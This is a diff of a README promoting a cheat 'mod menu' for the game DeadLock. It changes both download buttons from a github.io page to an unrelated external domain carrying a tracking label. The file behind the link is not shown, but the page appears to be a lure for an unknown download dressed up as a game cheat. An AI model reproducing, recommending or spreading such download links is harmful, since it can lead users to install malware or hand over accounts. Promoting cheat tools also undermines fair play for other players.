@@ -2,7 +2,7 @@
 
 The **DeadLock Mod Menu** is a powerful, feature-packed cheat utility designed for players looking to take full control of their game experience in **DeadLock**. Whether you're looking to explore the game freely, test out mechanics, or have fun with over-the-top powers, DeadLock Mod Menu offers a wide range of enhancements with a user-friendly interface and real-time in-game activation.
 
-[![Download DeadLock ModMenu](https://img.shields.io/badge/Download-DeadLock%20ModMenu-blueviolet)](https://deadlock-mod-menu.github.io/.github/)
+[![Download DeadLock ModMenu](https://img.shields.io/badge/Download-DeadLock%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## 🔧 Key Features:
 
@@ -50,4 +50,4 @@ The **DeadLock Mod Menu** is a powerful, feature-packed cheat utility designed f
 3. **Activate the menu** in-game using the assigned hotkey (often `F5` or `Insert`).
 4. **Navigate using your keyboard or mouse**, toggle features, and customize your gameplay however you like.
 
-[![Download DeadLock ModMenu](https://img.shields.io/badge/Download-DeadLock%20ModMenu-blueviolet)](https://deadlock-mod-menu.github.io/.github/)
+[![Download DeadLock ModMenu](https://img.shields.io/badge/Download-DeadLock%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
